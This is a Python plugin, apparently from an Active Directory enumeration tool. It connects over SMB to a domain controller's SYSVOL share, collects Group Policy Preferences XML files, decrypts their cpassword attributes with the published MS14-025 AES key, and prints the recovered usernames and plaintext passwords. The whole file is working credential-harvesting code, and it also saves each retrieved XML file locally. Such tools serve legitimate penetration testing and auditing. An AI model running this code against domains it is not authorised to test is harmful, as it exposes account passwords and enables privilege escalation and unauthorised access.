import os, binascii
import io
import logging
import base64
import tempfile
from Crypto.Cipher import AES
import xml.etree.ElementTree as ET

from modules.adldap import *
from modules.convert import *
from smb.SMBConnection import SMBConnection
from smb.smb_constants import *

'''
References

https://adsecurity.org/?p=2288

Powershell script for discovering GPP
https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati
'''

logger = logging.getLogger(__name__)

PLUGIN_NAME='gpp'
PLUGIN_INFO='''
Check the SYSVOL share on the domain controller for Group Policy Preferences (GPP) configurations
that include credentials. Standard users should be able to query these configurations and decrypt
the passwords (cPassword XML attribute) with a publically known AES key.
'''

g_parser = None

def get_parser():
    return g_parser

def list_sysvol(conn, path, attrs=0, filt='*'):
    try:
        files = conn.listPath('SYSVOL', path, attrs, filt)
        return files
    except:
        return []

# ref: https://msdn.microsoft.com/en-us/library/cc422924.aspx
AES_KEY=binascii.unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
def extract_cpassword(data, folder):
    r = ET.fromstring(data)
    creds = []
    parents = {c:p for p in r.iter() for c in p}
    for p in r.findall('.//Properties[@cpassword]'):
        user = ''
        if folder.lower() in ['groups', 'drives']:
            for a in ['newName', 'userName', 'name']:
                user = p.get(a, '')
                if len(user):
                    break
        else:
            user = p.get('runAs', '')
        cpass = p.get('cpassword', '')
        if len(user) == 0 or len(cpass) == 0:
            continue
        mod = len(cpass) % 4
        if mod == 1:
            cpass = cpass[:-1]
        elif mod in [2, 3]:
            cpass += '=' * (4-mod)
        aes = AES.new(AES_KEY, AES.MODE_CBC, IV=b'\x00'*16)
        pw = aes.decrypt(base64.b64decode(cpass))
        pad = pw[-1]
        pw = pw[:-pad].decode('utf-16-le')
        creds.append({'user':user, 'pass':pw, 'changed':parents[p].get('changed')})
    return creds

def handler(args, conn):
    ''' look for sysvol\domain\policies\{GUID}\*\Preferences\{groups,scheduledtasks}\*.xml '''
    dc_hostname = args.hostname or args.server
    conn = SMBConnection(args.username, args.password, 'adenum', dc_hostname, use_ntlm_v2=True,
                         domain=args.domain, is_direct_tcp=(args.smb_port != 139))
    conn.connect(args.server, port=args.smb_port)
    for p in list_sysvol(conn, args.domain+r'\Policies', SMB_FILE_ATTRIBUTE_DIRECTORY, '{*}'):
        if p.isDirectory:
            for mu in ['USER', 'MACHINE']:
                pref = '\\'.join([args.domain, 'Policies', p.filename, mu, 'Preferences'])
                logger.debug('PREF '+pref)
                for t in list_sysvol(conn, pref, SMB_FILE_ATTRIBUTE_DIRECTORY):
                    if t.filename.lower() in ['groups', 'drives', 'scheduledtasks', 'datasources', 'services', 'printers']:
                        path = '\\'.join([pref, t.filename])
                        for x in list_sysvol(conn, path, 55, '*.xml'):
                            if x.file_size > 0:
                                get = '\\'.join([pref, t.filename, x.filename])
                                logger.debug('GET '+get)
                                tmp = io.BytesIO()
                                a, n = conn.retrieveFile('SYSVOL', get, tmp)
                                creds = extract_cpassword(tmp.getvalue().decode('utf-8'), t.filename)
                                open(p.filename+x.filename, 'w').write(tmp.getvalue().decode('utf-8'))
                                if len(creds):
                                    print('File:', get)
                                    for c in creds:
                                        print('\tUser    "{}"'.format(c['user']))
                                        print('\tPass    "{}"'.format(c['pass']))
                                        print('\tChanged  {}'.format(c['changed']))
                                        print()
    conn.close()


def get_arg_parser(subparser):
    global g_parser
    if not g_parser:
        g_parser = subparser.add_parser(PLUGIN_NAME, help='Check Group Policy Preferences for creds')
        g_parser.set_defaults(handler=handler)
    return g_parser
